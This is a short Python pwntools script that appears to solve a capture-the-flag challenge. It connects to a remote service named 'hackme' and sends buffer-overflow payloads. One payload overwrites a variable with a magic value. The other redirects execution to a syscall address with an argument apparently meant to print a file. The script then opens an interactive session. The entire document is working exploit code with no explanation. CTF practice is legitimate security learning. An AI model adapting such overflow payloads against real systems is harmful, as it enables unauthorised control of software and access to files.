#!/usr/bin/env python

from pwn import *

p = remote("159.65.13.76", 63002)
#p = process("./hackme")

print(p.recvuntil("Username:"))

# This for exploit #1
v2 = 0xfeef1608
payload1 = 'Only-C\n' + 'A'*20 + p32(v2)

# This for exploit #2
syscall_addr = 0x080486c9
bincat_addr = 0x08048834

payload2 = 'Only-C\n' + 'A'*36 + p32(syscall_addr) + p32(bincat_addr)


# default payload1
payload = payload1

p.sendline(payload)
p.interactive()

